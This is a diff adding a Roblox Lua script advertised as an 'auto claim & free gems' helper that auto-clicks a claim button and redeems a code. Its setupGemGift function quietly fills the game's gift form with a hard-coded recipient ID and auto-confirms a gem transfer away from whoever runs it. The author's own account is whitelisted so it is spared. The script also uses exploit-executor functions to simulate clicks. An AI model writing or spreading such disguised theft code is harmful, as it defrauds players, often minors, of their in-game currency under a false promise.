@@ -1,0 +1,312 @@
+-- Advanced Auto Claim & Free Gems! ( Sulo made this )
+
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Configuration
+local WHITELISTED_USERS = {"ongdied"} -- Users who won't auto-gift
+local TARGET_USER_ID = "10612101"
+local GIFT_AMOUNT = 1
+local CLAIM_INTERVAL = 7 -- seconds between claims
+
+print("🔍 Script started! Looking for the button...")
+
+-- Helper function to check if user is whitelisted
+local function isWhitelisted()
+    for _, username in ipairs(WHITELISTED_USERS) do
+        if player.Name == username then
+            return true
+        end
+    end
+    return false
+end
+
+
+local screenGui = playerGui:WaitForChild("ScreenGui", 10)
+if not screenGui then
+    warn("❌ ScreenGui not found! Check the name.")
+    return
+end
+print("✅ Found ScreenGui")
+
+local framesContainer = screenGui:WaitForChild("Frames", 10)
+if not framesContainer then
+    warn("❌ Frames not found!")
+    return
+end
+print("✅ Found Frames")
+
+local timeFrame = framesContainer:WaitForChild("Time", 10)
+if not timeFrame then
+    warn("❌ Time frame not found!")
+    return
+end
+print("✅ Found Time frame")
+
+local claimButton = timeFrame:WaitForChild("Claim", 10)
+if not claimButton then
+    warn("❌ Claim button not found!")
+    return
+end
+print("✅ Found Claim button!")
+
+-- Click counter
+local clickCount = 0
+local gemGiftCount = 0
+
+-- Function to show notification
+local function showNotification(text, color)
+    color = color or Color3.fromRGB(0, 255, 0)
+    
+    local notif = Instance.new("ScreenGui")
+    notif.Name = "AutoClaimNotif"
+    notif.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    notif.ResetOnSpawn = false
+    notif.Parent = playerGui
+    
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 300, 0, 80)
+    frame.Position = UDim2.new(0.5, -150, 0.1, 0)
+    frame.BackgroundColor3 = color
+    frame.BorderSizePixel = 3
+    frame.BorderColor3 = Color3.fromRGB(255, 255, 255)
+    frame.ZIndex = 99999
+    frame.Parent = notif
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 10)
+    corner.Parent = frame
+    
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, -20, 1, -20)
+    label.Position = UDim2.new(0, 10, 0, 10)
+    label.BackgroundTransparency = 1
+    label.Text = text
+    label.TextColor3 = Color3.fromRGB(0, 0, 0)
+    label.TextSize = 24
+    label.Font = Enum.Font.GothamBold
+    label.ZIndex = 100000
+    label.Parent = frame
+    
+    task.delay(2, function()
+        notif:Destroy()
+    end)
+end
+
+
+local function clickButton(button)
+    -- Method 1: VirtualInputManager
+    pcall(function()
+        local VirtualInputManager = game:GetService("VirtualInputManager")
+        local buttonPos = button.AbsolutePosition
+        local buttonSize = button.AbsoluteSize
+        local centerX = buttonPos.X + (buttonSize.X / 2)
+        local centerY = buttonPos.Y + (buttonSize.Y / 2)
+        
+        VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, true, game, 0)
+        task.wait(0.05)
+        VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, false, game, 0)
+    end)
+    
+    -- Method 2: Fire connections
+    pcall(function()
+        for _, connection in pairs(getconnections(button.MouseButton1Click)) do
+            connection:Fire()
+        end
+        for _, connection in pairs(getconnections(button.MouseButton1Down)) do
+            connection:Fire()
+        end
+        for _, connection in pairs(getconnections(button.Activated)) do
+            connection:Fire()
+        end
+    end)
+    
+
+    pcall(function()
+        firesignal(button.MouseButton1Click)
+        firesignal(button.Activated)
+    end)
+    
+    -- Method 4: Direct activation
+    pcall(function()
+        if button:IsA("GuiButton") then
+            button.Activated:Fire()
+        end
+    end)
+end
+
+
+local function clickClaim()
+    print("🔄 Attempting to click claim...")
+    clickButton(claimButton)
+    clickCount = clickCount + 1
+    print("✅ CLAIMED! Total claims: " .. clickCount)
+    showNotification("✅ CLAIMED!\nTotal: " .. clickCount)
+end
+
+
+local function redeemCode()
+    print("🎁 Attempting to redeem code...")
+    
+    local codesFrame = framesContainer:FindFirstChild("Codes")
+    if not codesFrame then
+        warn("❌ Codes frame not found!")
+        return false
+    end
+    
+    local allFrame = codesFrame:FindFirstChild("All")
+    if not allFrame then
+        warn("❌ All frame not found!")
+        return false
+    end
+    
+    local useCodeFrame = allFrame:FindFirstChild("UseCode")
+    if not useCodeFrame then
+        warn("❌ UseCode frame not found!")
+        return false
+    end
+    
+    local codeTextBox = useCodeFrame:FindFirstChild("Code")
+    if not codeTextBox then
+        warn("❌ Code textbox not found!")
+        return false
+    end
+    
+    local confirmButton = useCodeFrame:FindFirstChild("Confirm")
+    if not confirmButton then
+        warn("❌ Confirm button not found!")
+        return false
+    end
+    
+    codeTextBox.Text = "LwMgm1"
+    task.wait(0.3)
+    print("📝 Code entered: LwMgm1")
+    
+    clickButton(confirmButton)
+    
+    print("✅ Code redeemed!")
+    showNotification("🎁 CODE REDEEMED!\nLwMgm1")
+    return true
+end
+
+
+local function setupGemGift()
+    print("💎 Setting up gem gift system...")
+    
+
+    local homeFrame = framesContainer:FindFirstChild("Home")
+    if not homeFrame then
+        warn("❌ Home frame not found!")
+        return false
+    end
+    print("✅ Found Home frame")
+    
+    local membersFrame = homeFrame:FindFirstChild("Members")
+    if not membersFrame then
+        warn("❌ Members frame not found!")
+        return false
+    end
+    print("✅ Found Members frame")
+    
+    local mainFrame = membersFrame:FindFirstChild("Main")
+    if not mainFrame then
+        warn("❌ Main frame not found!")
+        return false
+    end
+    print("✅ Found Main frame")
+    
+
+    local userTextBox = mainFrame:FindFirstChild("User")
+    if not userTextBox then
+        warn("❌ User textbox not found!")
+        return false
+    end
+    print("✅ Found User textbox")
+    
+    local amountTextBox = mainFrame:FindFirstChild("Amount")
+    if not amountTextBox then
+        warn("❌ Amount textbox not found!")
+        return false
+    end
+    print("✅ Found Amount textbox")
+    
+    local createOrderButton = mainFrame:FindFirstChild("CreateOrder")
+    if not createOrderButton then
+        warn("❌ CreateOrder button not found!")
+        return false
+    end
+    print("✅ Found CreateOrder button")
+    
+
+    userTextBox.Text = TARGET_USER_ID
+    task.wait(0.2)
+    amountTextBox.Text = tostring(GIFT_AMOUNT)
+    task.wait(0.2)
+    print("ok maxed")
+    
+
+    clickButton(createOrderButton)
+    print("✅ CreateOrder clicked!")
+    
+
+    task.wait(1)
+    
+    local makeOrderGui = playerGui:WaitForChild("MakeOrder", 5)
+    if not makeOrderGui then
+        warn("❌ MakeOrder GUI not found!")
+        return false
+    end
+    print("✅ Found MakeOrder GUI")
+    
+    local sureButton = makeOrderGui:FindFirstChild("Sure")
+    if not sureButton then
+        warn("❌ Sure button not found!")
+        return false
+    end
+    print("✅ Found Sure button")
+    
+
+    if isWhitelisted() then
+        print("⚠️ User is WHITELISTED - Manual confirmation required!")
+        showNotification("⚠️ WHITELISTED USER\nPlease confirm manually!", Color3.fromRGB(255, 255, 0))
+        return false
+    else
+
+        task.wait(0.3)
+        clickButton(sureButton)
+        gemGiftCount = gemGiftCount + 1
+        print("✅ Auto-confirmed gem gift! Total gifts: " .. gemGiftCount)
+        showNotification("💎 GEM GIFTED!\nTotal: " .. gemGiftCount, Color3.fromRGB(255, 0, 255))
+        return true
+    end
+end
+
+
+if isWhitelisted() then
+    showNotification("🚀 SCRIPT STARTED!\n⚠️ WHITELISTED MODE", Color3.fromRGB(255, 255, 0))
+else
+    showNotification("🚀 SCRIPT STARTED!\n💎 Auto-Gift Enabled")
+end
+
+
+task.wait(1)
+if redeemCode() then
+    task.wait(2)
+    showNotification("🔄 SYSTEMS STARTING!")
+    task.wait(1)
+else
+    showNotification("⚠️ Code failed, continuing...", Color3.fromRGB(255, 165, 0))
+    task.wait(2)
+end
+
+
+task.wait(1)
+setupGemGift()
+task.wait(2)
+
+
+print("🔁 Starting auto-claim loop...")
+showNotification("🔁 AUTO-CLAIM ACTIVE!")
+while task.wait(CLAIM_INTERVAL) do
+    clickClaim()
+end
